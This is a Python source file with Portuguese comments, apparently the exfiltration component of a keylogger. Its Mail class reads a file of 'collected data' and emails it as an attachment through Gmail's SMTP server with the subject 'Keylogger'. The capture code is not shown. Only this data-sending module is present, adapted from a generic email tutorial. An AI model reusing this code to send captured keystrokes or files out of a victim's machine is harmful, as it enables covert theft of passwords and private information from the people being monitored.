# Código utilizado como apoio disponibilizado em:
# https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/

# Classe responsável por enviar por email os dados coletados

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class Mail:

    def __init__(self, sender, rec, pw, file):
        self.filename = file
        self.sender = sender
        self.receiver = rec
        self.pw = pw

    def send(self):

        msg = MIMEMultipart()

        # Campos do email
        msg['From'] = self.sender
        msg['To'] = self.receiver
        msg['Subject'] = "Keylogger"
        body = "Message from python"

        # Configurando dado
        msg.attach(MIMEText(body, 'plain'))
        attachment = open(self.filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % self.filename)
        msg.attach(p)

        # Enviando email
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(self.sender, self.pw)
        text = msg.as_string()
        s.sendmail(self.sender, self.receiver, text)
        s.quit()
